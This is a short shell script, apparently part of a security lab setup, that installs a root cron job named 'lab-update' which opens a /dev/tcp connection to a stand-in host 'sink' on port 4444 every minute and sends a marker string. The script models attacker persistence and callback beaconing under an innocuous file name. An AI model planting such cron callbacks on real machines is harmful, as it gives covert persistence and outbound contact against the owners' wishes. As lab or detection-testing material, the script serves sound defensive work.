#!/bin/sh
# A cron job that runs the callback stand-in (one connection to sink:4444) every minute.
# Runs as root inside a lab machine. Stand-ins are expected in /lab/standins.
set -eu
SI=/lab/standins
need() { [ -e "$SI/$1" ] || { echo "$0: $SI/$1 is missing (copy the stand-ins in first)" >&2; exit 1; }; }
echo "* * * * * root /bin/bash -c 'exec 3<>/dev/tcp/sink/4444 && echo lab-callback >&3'" > /etc/cron.d/lab-update
chmod 644 /etc/cron.d/lab-update
